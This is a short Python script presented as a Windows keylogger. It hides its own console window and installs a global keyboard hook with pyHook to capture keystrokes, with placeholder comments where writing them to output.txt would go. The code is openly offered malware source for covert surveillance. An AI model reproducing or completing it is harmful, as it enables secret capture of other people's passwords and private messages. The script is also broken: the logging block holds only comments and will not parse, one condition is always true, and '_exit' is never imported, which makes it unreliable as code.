# Python code for keylogger 
# to be used in windows 
import win32api 
import win32console 
import win32gui 
import pythoncom, pyHook 

win = win32console.GetConsoleWindow() 
win32gui.ShowWindow(win, 0) 

def OnKeyboardEvent(event): 
	if event.Ascii==5: 
		_exit(1) 
	if event.Ascii !=0 or 8: 
	#open output.txt to read current keystrokes 

	#open output.txt to write current + new keystrokes 
		
# create a hook manager object 
hm = pyHook.HookManager() 
hm.KeyDown = OnKeyboardEvent 
# set the hook 
hm.HookKeyboard() 
# wait forever 
pythoncom.PumpMessages() 
